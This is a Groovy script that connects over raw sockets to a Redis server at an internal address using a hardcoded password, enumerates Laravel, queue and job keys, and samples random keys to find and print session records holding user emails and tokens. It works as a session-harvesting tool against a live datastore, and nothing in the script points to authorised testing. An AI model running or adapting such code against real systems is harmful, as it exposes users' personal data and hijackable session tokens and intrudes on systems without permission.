import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisExec(String host, int port, String password, List<String> commands) {
    def results = []
    Socket sock = null
    try {
        sock = new Socket()
        sock.connect(new java.net.InetSocketAddress(host, port), 5000)
        sock.setSoTimeout(5000)
        def os = sock.getOutputStream()
        def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
        
        os.write("AUTH ${password}\r\n".getBytes())
        os.flush()
        Thread.sleep(300)
        readAll(br)
        
        commands.each { cmd ->
            os.write("${cmd}\r\n".getBytes())
            os.flush()
            Thread.sleep(200)
            results << [cmd: cmd, resp: readAll(br)]
        }
    } catch (Exception e) {
        results << [cmd: "ERROR", resp: "${e.class.simpleName}: ${e.message}"]
    } finally {
        try { sock?.close() } catch(Exception e) {}
    }
    return results
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(200); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== FINDING ACTIVE SESSIONS + NON-SRQA KEYS ==="

// 1. Find keys that are NOT srqaclient pattern
def cmds = []
cmds << "SCAN 0 MATCH failed* COUNT 1000"
cmds << "SCAN 0 MATCH queue* COUNT 1000"
cmds << "SCAN 0 MATCH job* COUNT 1000"
cmds << "SCAN 0 MATCH LARAVEL* COUNT 1000"
cmds << "SCAN 0 MATCH laravel* COUNT 1000"
cmds << "SCAN 0 MATCH horizon* COUNT 1000"
cmds << "SCAN 0 MATCH bull* COUNT 1000"
cmds << "SCAN 0 MATCH celery* COUNT 1000"
cmds << "SCAN 0 MATCH rq:* COUNT 1000"
cmds << "SCAN 0 MATCH _* COUNT 1000"
cmds << "SCAN 0 MATCH [a-z]* COUNT 100"

def r1 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", cmds)
println "\n--- NON-SRQA PATTERNS ---"
r1.each { r ->
    def lines = r.resp.split('\n').findAll { !it.startsWith('*') && !it.startsWith('\$') && it.trim() }
    if (lines.size() > 1) {
        println "\n${r.cmd}:"
        lines.each { println "  ${it}" }
    }
}

// 2. Get the failed key value
def cmds2 = []
cmds2 << "GET failed_2020-08-31_12:35:48marketplace_20-08-31_12:35:47"
cmds2 << "TYPE failed_2020-08-31_12:35:48marketplace_20-08-31_12:35:47"
cmds2 << "TTL failed_2020-08-31_12:35:48marketplace_20-08-31_12:35:47"

def r2 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", cmds2)
println "\n--- FAILED KEY DATA ---"
r2.each { r ->
    def val = r.resp
    if (val.length() > 2000) val = val.substring(0, 2000) + "...[TRUNCATED]"
    println "${r.cmd} => ${val}"
}

// 3. Sample active sessions (with non-null data)
println "\n--- SEARCHING ACTIVE SESSIONS (with user data) ---"
def scanCmds = []
(0..9).each { i ->
    scanCmds << "RANDOMKEY"
}
def rSample = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", scanCmds)
def activeCount = 0
def sampleKeys = rSample.collect { it.resp.replaceAll('\\$\\d+\\n', '').trim() }

def getCmds = []
sampleKeys.each { k ->
    getCmds << "GET ${k}"
}
def rValues = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", getCmds)
rValues.each { r ->
    def val = r.resp
    if (val.contains('s:') && !val.contains('"";N;')) {
        activeCount++
    }
    if (val.contains('"email"') && !val.contains('"email";N;')) {
        println "\nACTIVE SESSION FOUND!"
        println val.substring(0, Math.min(val.length(), 1500))
    }
}

// 4. Bigger scan for active sessions - scan 50 random keys
println "\n--- SCANNING 50 RANDOM KEYS FOR ACTIVE SESSIONS ---"
def bigScan = []
(0..49).each { bigScan << "RANDOMKEY" }
def rBig = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", bigScan)
def bigKeys = rBig.collect { it.resp.replaceAll('\\$\\d+\\n', '').trim() }

def activeKeys = []
bigKeys.collate(10).each { batch ->
    def batchCmds = batch.collect { "GET ${it}" }
    def batchR = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", batchCmds)
    batchR.each { r ->
        def v = r.resp
        if (v.contains('"email"') && v.contains('@') && !v.contains('"email";N;')) {
            activeKeys << r.cmd.replace('GET ', '') 
            println "\nACTIVE: ${v.substring(0, Math.min(v.length(), 800))}"
        } else if (v.contains('"token"') && !v.contains('"token";N;')) {
            activeKeys << r.cmd.replace('GET ', '')
            println "\nTOKEN SESSION: ${v.substring(0, Math.min(v.length(), 800))}"
        }
    }
}
println "\nActive sessions found in 50 samples: ${activeKeys.size()}"

println "\n=== ACTIVE SESSION SCAN DONE ==="
